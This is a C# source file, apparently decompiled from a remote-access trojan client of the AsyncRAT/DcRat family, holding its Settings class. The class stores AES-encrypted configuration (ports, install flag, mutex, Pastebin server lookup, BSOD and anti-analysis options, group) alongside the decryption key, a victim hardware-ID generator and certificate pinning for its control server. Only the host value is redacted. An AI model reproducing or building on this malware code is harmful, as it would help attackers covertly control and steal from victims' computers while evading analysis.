using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Fafnir;

namespace Client;

public static class Settings
{
	public static string Por_ts = "Ms1/xDnyonaP6RuiT+/hJRqYkpl24q5aqyuC8zt577/cVGnBCThn+qnJcNWKS5tQgkdPHY7w99thVjkkIxvYCA==";

	public static string Hos_ts = "REDACTED";

	public static string Ver_sion = "C2HjFgqCNQ+9YVq+gqD0xO2BqnUQWIjWPxG3DS8jTAAlJfPGJnL2p/Y5VuKAjHgd8lkKlwqpxuuTWQMHusr9EA==";

	public static string In_stall = "pHbVcJDVbCFRRMe9gzltS8XfkeBNs6GL7oU3raGE7BXkCQUORBlKqQH5OkRirOhmoa9uPbXnOs2c5sFUjJ2HSw==";

	public static string Install_Folder = "";

	public static string Install_File = "";

	public static string Key = "bGg2alF6RnBQUmNmM044a05tRWJqSjd2MmIybDRuSEU=";

	public static string MTX = "3m5WeXk/TqRzJR2Q2fRSZimhCQtZfcu4WocEZnjXA8DUWuW/Q7W3qNchNEBfa+SD3wfKcS8KfPpww3pV+7eFFYdNF84qVomgpk1UGBgcQpg=";

	public static string Certifi_cate = "jq+7E3fhiEnXmfQ85ZyXZ5IkKpkQkG31yQ8YKTWv5x1AyuQFEbYzxUcmtctjeAOpRv45/cTyNust+yqFe31/HyyqlWgJbYpzlouydXnaZwyRYNkemWYat+D6nE40xjbx0kx13A5HzG8rPWobg8sp0Bx2HXNOGikZ7o9EbUFrYSLrn8Bqg87srZf2Bd1IuHi7v+7rR/MDkih7oQ6deQ5z6/8DeTQHRCqp0FURv3ppxP8vF2WLrbC9FjqnovtR2J/xT80x+pWKFapOmKxleNCZkqqEyS0WwHkgfKEPznwD0FSPIwg28/+7kNtGMjPMgSYFqXewbeXKw6Cxp9hImntEKC6UBCdti8V3gynFur1ugk/jsF5cepHcZVIdQEhst+o2gh8qrDawRZpZePo+iR76E3bRKYg7z3DBcmno/3FjlYLOdnsMydybKpKi3xhSoq/dqh3A/JmZL/9744+YzjO6ulkvMNnKnoaxpdrpUp3bxf2pZq7hT0V9hvxaoQHshqC6ksL6X3jkgSt6HImG64A0EhYmHB7dyW+ldAOPjH9596ZUzoo2Q2q0Tpe4hUQ106zEoEzZc+6YLvntj69/G5LB1ozfuKIwTC1ZtmBZKhUKX66HCxDGtJAkssKRUxO7eOfFtgUYqnx2O2ZHSONQDYfduy+XQMqczoRCRVUi81wma1beWLaNT2aEXRjN0lPAemG2wMUkHITQaVnKy917zX8O9Fvn3IoOQPNZN0o0ikNg4TqUpQLaM44Yq5b35jruH3qTmMVE87+cnKNFKBy1tlxMnNaeKaQRu4PWI/9LV/rTSloDecWOclbREo1AozdI/4NIHo1Kcwp8B6JrhIvHx/sMlyUHGm7WIQzv5yMXAtNA/pHIFWF/WUMQySvaI5opH25tTINhqickPN6Hiq+keTWUd4n3ppUOnxFs68ZWp1voUGOzxiwZfBLVF2p91eoyE2dvvLytswHLFt/XxO2OQU3a213FPdVFp4fCQzuLc7wZVd0sf3uDqu49nQC8N+PYOdwYTpgYc5h68ZT7CaZN7tBazBAY2TeKrjU0DLnE++rOLRJ6RJGC6pvTIFMc9wDAGdfO";

	public static string Server_signa_ture = "Yujq4E+p7XcBCNqdx92KyzRzdvHG3hW6SWKeTPhy/6Oq7Bs49z93O7vyIVSZD0wRYzvjIe8qm6t9IcFQ5cGnBtbCUuTHEAnUscXJGM+vsFmm+3AcSWIgCN8TTQV9XVI0zJGhDCYd+T2hOtmUAd5R1xgJRhSprja4sXj6rAtgsSOHpAunm3GUnC5P0tvKNNWVRPnyFmmAh22sSuxvw8IUJ+H1zGWnlXiqpWl5xkTUNzI1i+l2OKLGGmD6Cvl48ascjwjKVg94buVbw9MktApvQsVwRQAXEx3XhSSMLvsqH8g=";

	public static X509Certificate2 Server_Certificate;

	public static Aes256 aes256;

	public static string Paste_bin = "8taLamcZgKQNzVRh8QbEbawnFNx2Vx9JZObrwoZvHIPne+js7pz83i1Rg/fvJiPdeS6aWnvdrdwtEGH96Cnksg==";

	public static string BS_OD = "cj5bcROMNIOrAYY5/MjCejZA3bMOougp6vww+/P/+TouCYTZcDehFBPINnwERADNBbNoWU6NdJypHmjuxhod9A==";

	public static string Hw_id = null;

	public static string De_lay = "1";

	public static string Group = "eT3aODL00E6C0WRAAzOPsxHJ/3Rnw0brUSGpI6sb2ldYL4roUlpBKnS5qUKsZS6vmghZ2p2DgTZHQL1KUuNiWQ==";

	public static string Anti_Process = "9PXVUGSYFfhCCxWLJ7JTfVd5bnbLTjoyPlpiAsenXZRNyOT16l8os6b8RTyZp66HXnVjcgbxCA978ab4E0fmvg==";

	public static string An_ti = "rKtczUY2ADM2WIaufubx1wM1nD7fKzAyAYNZ/rZuIIqzXJgf1gR0OkVHycCWUAAV3CZrI8QPLc0GgElP1zOhpw==";

	public static string Exclude = "%exclude%";

	public static string OffLog = "true";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Por_ts = aes256.Decrypt(Por_ts);
			Hos_ts = aes256.Decrypt(Hos_ts);
			Ver_sion = aes256.Decrypt(Ver_sion);
			In_stall = aes256.Decrypt(In_stall);
			MTX = aes256.Decrypt(MTX);
			Paste_bin = aes256.Decrypt(Paste_bin);
			An_ti = aes256.Decrypt(An_ti);
			Anti_Process = aes256.Decrypt(Anti_Process);
			BS_OD = aes256.Decrypt(BS_OD);
			Group = aes256.Decrypt(Group);
			Hw_id = HwidGen.HWID();
			Server_signa_ture = aes256.Decrypt(Server_signa_ture);
			Server_Certificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certifi_cate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)Server_Certificate.PublicKey.Key;
			using SHA256Managed sHA256Managed = new SHA256Managed();
			return rSACryptoServiceProvider.VerifyHash(sHA256Managed.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Server_signa_ture));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
